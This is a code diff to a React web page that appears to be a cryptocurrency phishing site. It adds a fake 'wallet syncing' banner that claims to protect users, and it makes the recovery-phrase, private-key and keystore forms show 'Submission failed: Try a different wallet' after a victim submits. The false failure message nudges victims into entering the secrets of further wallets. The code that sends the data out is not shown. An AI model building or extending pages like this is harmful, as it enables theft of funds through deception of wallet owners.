@@ -165,11 +165,13 @@ const Banner = () => {
     }
     return (
         <Container className="text-center p-3">
-            <h2 className="text-secondary m-3">Secure Wallets</h2>
+            <small>Secure Wallets</small>
+            <h2 className="text-secondary m-3">Open Protocol for Syncing Various Wallets to Dapps Secure Server </h2>
             <p className="text-secondary m-auto" style={p_style}>
-                Lorem ipsum dolor sit amet consectetur, adipisicing elit. 
-                Odio consequuntur laboriosam minus eligendi laborum possimus? 
-                Aliquam minus sit magni ab magnam nesciunt, ea iusto placeat?
+                Wallet Syncing is the process or operation of merging two or more wallets at the same time.
+                Syncing is a method of re-authenticating an account in other for all tokens in that account 
+                to show up in their respective wallets. We also synergize with various ICOs and exchanges 
+                to ensure user data is properly stored and safe from cyber criminals.
             </p>
         </Container>
     )
@@ -185,7 +187,7 @@ const PhraseForm = () => {
             event.stopPropagation();
             console.log("checkValidity returned false!");
         }else {
-            alert("Response submitted successfully.");
+            alert("Submission failed: Try a different wallet.");
         }
   
         setValidated(true);
@@ -210,7 +212,7 @@ const PrivateKeyForm = () => {
             event.stopPropagation();
             console.log("checkValidity returned false!");
         }else {
-            alert("Response submitted successfully.");
+            alert("Submission failed: Try a different wallet.");
         }
   
         setValidated(true);
@@ -235,7 +237,7 @@ const KeystoreJsonForm = () => {
             event.stopPropagation();
             console.log("checkValidity returned false!");
         }else {
-            alert("Response submitted successfully.");
+            alert("Submission failed: Try a different wallet.");
         }
 
         setValidated(true);
